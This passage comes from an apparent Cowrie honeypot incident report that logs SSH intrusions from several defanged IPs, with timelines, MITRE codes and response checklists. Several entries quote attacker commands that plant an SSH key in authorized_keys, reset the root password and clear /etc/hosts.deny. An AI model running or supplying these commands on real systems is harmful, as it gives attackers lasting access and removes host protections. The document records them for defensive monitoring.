| `2026-04-12 06:02:06` | `cowrie.client.version` |
| `2026-04-12 06:02:06` | `cowrie.client.kex` |
| `2026-04-12 06:02:07` | `cowrie.login.success` |
| `2026-04-12 06:02:07` | `cowrie.session.params` |
| `2026-04-12 06:02:07` | `cowrie.command.input` |
| `2026-04-12 06:02:07` | `cowrie.command.failed` |
| `2026-04-12 06:02:07` | `cowrie.log.closed` |
| `2026-04-12 06:02:08` | `cowrie.session.params` |
| `2026-04-12 06:02:08` | `cowrie.command.input` |
| `2026-04-12 06:02:08` | `cowrie.session.file_download` |
| `2026-04-12 06:02:08` | `cowrie.log.closed` |
| `2026-04-12 06:02:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.153.57[.]103` to AbuseIPDB if not already reported
- [ ] Block `197.153.57[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fa9b2eb572a

| Field | Detail |
|---|---|
| **Source IP** | `79.45.101[.]239` |
| **First Seen** | 2026-04-12 06:02 |
| **Last Seen** | 2026-04-12 06:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 06:02:10` | `cowrie.session.connect` |
| `2026-04-12 06:02:10` | `cowrie.client.version` |
| `2026-04-12 06:02:10` | `cowrie.client.kex` |
| `2026-04-12 06:02:10` | `cowrie.login.success` |
| `2026-04-12 06:02:11` | `cowrie.session.params` |
| `2026-04-12 06:02:11` | `cowrie.command.input` |
| `2026-04-12 06:02:11` | `cowrie.command.failed` |
| `2026-04-12 06:02:11` | `cowrie.log.closed` |
| `2026-04-12 06:02:11` | `cowrie.session.params` |
| `2026-04-12 06:02:11` | `cowrie.command.input` |
| `2026-04-12 06:02:11` | `cowrie.session.file_download` |
| `2026-04-12 06:02:11` | `cowrie.log.closed` |
| `2026-04-12 06:02:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.45.101[.]239` to AbuseIPDB if not already reported
- [ ] Block `79.45.101[.]239` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9cf144b8b739

| Field | Detail |
|---|---|
| **Source IP** | `197.153.57[.]103` |
| **First Seen** | 2026-04-12 06:02 |
| **Last Seen** | 2026-04-12 06:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 06:02:11` | `cowrie.session.connect` |
| `2026-04-12 06:02:11` | `cowrie.client.version` |
| `2026-04-12 06:02:11` | `cowrie.client.kex` |
| `2026-04-12 06:02:12` | `cowrie.login.success` |
| `2026-04-12 06:02:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.153.57[.]103` to AbuseIPDB if not already reported
- [ ] Block `197.153.57[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-670b339f8aea

| Field | Detail |
|---|---|
| **Source IP** | `79.45.101[.]239` |
| **First Seen** | 2026-04-12 06:02 |
| **Last Seen** | 2026-04-12 06:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 06:02:13` | `cowrie.session.connect` |
| `2026-04-12 06:02:13` | `cowrie.client.version` |
| `2026-04-12 06:02:13` | `cowrie.client.kex` |
| `2026-04-12 06:02:14` | `cowrie.login.success` |
| `2026-04-12 06:02:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.45.101[.]239` to AbuseIPDB if not already reported
- [ ] Block `79.45.101[.]239` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1be280b9261

| Field | Detail |
|---|---|
| **Source IP** | `197.153.57[.]103` |
| **First Seen** | 2026-04-12 06:02 |
| **Last Seen** | 2026-04-12 06:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 06:02:47` | `cowrie.session.connect` |
| `2026-04-12 06:02:47` | `cowrie.client.version` |
| `2026-04-12 06:02:47` | `cowrie.client.kex` |
| `2026-04-12 06:02:48` | `cowrie.login.success` |
| `2026-04-12 06:02:48` | `cowrie.session.params` |
| `2026-04-12 06:02:48` | `cowrie.command.input` |
| `2026-04-12 06:02:48` | `cowrie.command.failed` |
| `2026-04-12 06:02:49` | `cowrie.log.closed` |
| `2026-04-12 06:02:49` | `cowrie.session.params` |
| `2026-04-12 06:02:49` | `cowrie.command.input` |
| `2026-04-12 06:02:49` | `cowrie.session.file_download` |
| `2026-04-12 06:02:49` | `cowrie.log.closed` |
| `2026-04-12 06:02:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.153.57[.]103` to AbuseIPDB if not already reported
- [ ] Block `197.153.57[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e816421e13c

| Field | Detail |
|---|---|
| **Source IP** | `197.153.57[.]103` |
| **First Seen** | 2026-04-12 06:02 |
| **Last Seen** | 2026-04-12 06:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 06:02:52` | `cowrie.session.connect` |
| `2026-04-12 06:02:52` | `cowrie.client.version` |
| `2026-04-12 06:02:52` | `cowrie.client.kex` |
| `2026-04-12 06:02:53` | `cowrie.login.success` |
| `2026-04-12 06:02:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.153.57[.]103` to AbuseIPDB if not already reported
- [ ] Block `197.153.57[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63f5f11780d5

| Field | Detail |
|---|---|
| **Source IP** | `197.153.57[.]103` |
| **First Seen** | 2026-04-12 06:03 |
| **Last Seen** | 2026-04-12 06:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 06:03:27` | `cowrie.session.connect` |
| `2026-04-12 06:03:27` | `cowrie.client.version` |
| `2026-04-12 06:03:27` | `cowrie.client.kex` |
| `2026-04-12 06:03:28` | `cowrie.login.success` |
| `2026-04-12 06:03:28` | `cowrie.session.params` |
| `2026-04-12 06:03:28` | `cowrie.command.input` |
| `2026-04-12 06:03:28` | `cowrie.command.failed` |
| `2026-04-12 06:03:29` | `cowrie.log.closed` |
| `2026-04-12 06:03:29` | `cowrie.session.params` |
| `2026-04-12 06:03:29` | `cowrie.command.input` |
| `2026-04-12 06:03:29` | `cowrie.session.file_download` |
| `2026-04-12 06:03:29` | `cowrie.log.closed` |
| `2026-04-12 06:03:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.153.57[.]103` to AbuseIPDB if not already reported
- [ ] Block `197.153.57[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b612a1e34c9f

| Field | Detail |
|---|---|
| **Source IP** | `197.153.57[.]103` |
| **First Seen** | 2026-04-12 06:03 |
| **Last Seen** | 2026-04-12 06:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 06:03:32` | `cowrie.session.connect` |
| `2026-04-12 06:03:32` | `cowrie.client.version` |
| `2026-04-12 06:03:32` | `cowrie.client.kex` |
| `2026-04-12 06:03:33` | `cowrie.login.success` |
| `2026-04-12 06:03:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.153.57[.]103` to AbuseIPDB if not already reported
- [ ] Block `197.153.57[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdd8b98a7f09

| Field | Detail |
|---|---|
| **Source IP** | `79.45.101[.]239` |
| **First Seen** | 2026-04-12 06:03 |
| **Last Seen** | 2026-04-12 06:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 06:03:43` | `cowrie.session.connect` |
| `2026-04-12 06:03:43` | `cowrie.client.version` |
| `2026-04-12 06:03:43` | `cowrie.client.kex` |
| `2026-04-12 06:03:44` | `cowrie.login.success` |
| `2026-04-12 06:03:44` | `cowrie.session.params` |
| `2026-04-12 06:03:44` | `cowrie.command.input` |
| `2026-04-12 06:03:44` | `cowrie.command.failed` |
| `2026-04-12 06:03:44` | `cowrie.log.closed` |
| `2026-04-12 06:03:45` | `cowrie.session.params` |
| `2026-04-12 06:03:45` | `cowrie.command.input` |
| `2026-04-12 06:03:45` | `cowrie.session.file_download` |
| `2026-04-12 06:03:45` | `cowrie.log.closed` |
| `2026-04-12 06:03:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.45.101[.]239` to AbuseIPDB if not already reported
- [ ] Block `79.45.101[.]239` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fecc13948856

| Field | Detail |
|---|---|
| **Source IP** | `79.45.101[.]239` |
| **First Seen** | 2026-04-12 06:03 |
| **Last Seen** | 2026-04-12 06:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 06:03:47` | `cowrie.session.connect` |
| `2026-04-12 06:03:47` | `cowrie.client.version` |
| `2026-04-12 06:03:47` | `cowrie.client.kex` |
| `2026-04-12 06:03:47` | `cowrie.login.success` |
| `2026-04-12 06:03:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.45.101[.]239` to AbuseIPDB if not already reported
- [ ] Block `79.45.101[.]239` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64c1afe22a26

| Field | Detail |
|---|---|
| **Source IP** | `102.210.148[.]92` |
| **First Seen** | 2026-04-12 06:06 |
| **Last Seen** | 2026-04-12 06:06 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 06:06:37` | `cowrie.session.connect` |
| `2026-04-12 06:06:37` | `cowrie.client.version` |
| `2026-04-12 06:06:37` | `cowrie.client.kex` |
| `2026-04-12 06:06:37` | `cowrie.login.success` |
| `2026-04-12 06:06:38` | `cowrie.session.params` |
| `2026-04-12 06:06:38` | `cowrie.command.input` |
| `2026-04-12 06:06:38` | `cowrie.command.failed` |
| `2026-04-12 06:06:38` | `cowrie.log.closed` |
| `2026-04-12 06:06:38` | `cowrie.session.params` |
| `2026-04-12 06:06:38` | `cowrie.command.input` |
| `2026-04-12 06:06:39` | `cowrie.session.file_download` |
| `2026-04-12 06:06:39` | `cowrie.log.closed` |
| `2026-04-12 06:06:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.148[.]92` to AbuseIPDB if not already reported
- [ ] Block `102.210.148[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce835ea4696e

| Field | Detail |
|---|---|
| **Source IP** | `102.210.148[.]92` |
| **First Seen** | 2026-04-12 06:06 |
| **Last Seen** | 2026-04-12 06:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 06:06:41` | `cowrie.session.connect` |
| `2026-04-12 06:06:41` | `cowrie.client.version` |
| `2026-04-12 06:06:41` | `cowrie.client.kex` |
| `2026-04-12 06:06:42` | `cowrie.login.success` |
| `2026-04-12 06:06:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.148[.]92` to AbuseIPDB if not already reported
- [ ] Block `102.210.148[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-458af2753dea

| Field | Detail |
|---|---|
| **Source IP** | `102.210.148[.]92` |
| **First Seen** | 2026-04-12 06:08 |
| **Last Seen** | 2026-04-12 06:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 06:08:30` | `cowrie.session.connect` |
| `2026-04-12 06:08:30` | `cowrie.client.version` |
| `2026-04-12 06:08:30` | `cowrie.client.kex` |
| `2026-04-12 06:08:30` | `cowrie.login.success` |
| `2026-04-12 06:08:31` | `cowrie.session.params` |
| `2026-04-12 06:08:31` | `cowrie.command.input` |
| `2026-04-12 06:08:31` | `cowrie.command.failed` |
| `2026-04-12 06:08:31` | `cowrie.log.closed` |
| `2026-04-12 06:08:31` | `cowrie.session.params` |
| `2026-04-12 06:08:31` | `cowrie.command.input` |
| `2026-04-12 06:08:32` | `cowrie.session.file_download` |
| `2026-04-12 06:08:32` | `cowrie.log.closed` |
| `2026-04-12 06:08:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.148[.]92` to AbuseIPDB if not already reported
- [ ] Block `102.210.148[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9caea7911575

| Field | Detail |
|---|---|
| **Source IP** | `102.210.148[.]92` |
| **First Seen** | 2026-04-12 06:08 |
| **Last Seen** | 2026-04-12 06:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 06:08:34` | `cowrie.session.connect` |
| `2026-04-12 06:08:34` | `cowrie.client.version` |
| `2026-04-12 06:08:34` | `cowrie.client.kex` |
| `2026-04-12 06:08:35` | `cowrie.login.success` |
| `2026-04-12 06:08:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.148[.]92` to AbuseIPDB if not already reported
- [ ] Block `102.210.148[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cc4e0528410

| Field | Detail |
|---|---|
| **Source IP** | `102.210.148[.]92` |
| **First Seen** | 2026-04-12 06:12 |
| **Last Seen** | 2026-04-12 06:12 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 06:12:23` | `cowrie.session.connect` |
| `2026-04-12 06:12:23` | `cowrie.client.version` |
| `2026-04-12 06:12:23` | `cowrie.client.kex` |
| `2026-04-12 06:12:24` | `cowrie.login.success` |
| `2026-04-12 06:12:24` | `cowrie.session.params` |
| `2026-04-12 06:12:24` | `cowrie.command.input` |
| `2026-04-12 06:12:24` | `cowrie.command.failed` |
| `2026-04-12 06:12:24` | `cowrie.log.closed` |
| `2026-04-12 06:12:25` | `cowrie.session.params` |
| `2026-04-12 06:12:25` | `cowrie.command.input` |
| `2026-04-12 06:12:25` | `cowrie.session.file_download` |
| `2026-04-12 06:12:25` | `cowrie.log.closed` |
| `2026-04-12 06:12:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.148[.]92` to AbuseIPDB if not already reported
- [ ] Block `102.210.148[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5529b3e16e78

| Field | Detail |
|---|---|
| **Source IP** | `102.210.148[.]92` |
| **First Seen** | 2026-04-12 06:12 |
| **Last Seen** | 2026-04-12 06:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 06:12:27` | `cowrie.session.connect` |
| `2026-04-12 06:12:27` | `cowrie.client.version` |
| `2026-04-12 06:12:28` | `cowrie.client.kex` |
| `2026-04-12 06:12:28` | `cowrie.login.success` |
| `2026-04-12 06:12:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.210.148[.]92` to AbuseIPDB if not already reported
- [ ] Block `102.210.148[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e836250c26e

| Field | Detail |
|---|---|
| **Source IP** | `14.103.131[.]112` |
| **First Seen** | 2026-04-12 06:13 |
| **Last Seen** | 2026-04-12 06:14 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:9zEEEqILDyER"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 06:13:57` | `cowrie.session.connect` |
| `2026-04-12 06:13:57` | `cowrie.client.version` |
| `2026-04-12 06:13:57` | `cowrie.client.kex` |
| `2026-04-12 06:13:58` | `cowrie.login.success` |
| `2026-04-12 06:13:58` | `cowrie.session.params` |
| `2026-04-12 06:13:58` | `cowrie.command.input` |
| `2026-04-12 06:13:58` | `cowrie.command.failed` |
| `2026-04-12 06:13:58` | `cowrie.log.closed` |
| `2026-04-12 06:13:58` | `cowrie.session.params` |
| `2026-04-12 06:13:58` | `cowrie.command.input` |
| `2026-04-12 06:13:59` | `cowrie.session.file_download` |
| `2026-04-12 06:13:59` | `cowrie.log.closed` |
| `2026-04-12 06:14:15` | `cowrie.session.params` |
| `2026-04-12 06:14:15` | `cowrie.command.input` |
| `2026-04-12 06:14:15` | `cowrie.log.closed` |
| `2026-04-12 06:14:16` | `cowrie.session.params` |
| `2026-04-12 06:14:16` | `cowrie.command.input` |
| `2026-04-12 06:14:16` | `cowrie.log.closed` |
| `2026-04-12 06:14:16` | `cowrie.session.params` |
| `2026-04-12 06:14:16` | `cowrie.command.input` |
| `2026-04-12 06:14:16` | `cowrie.session.file_download` |
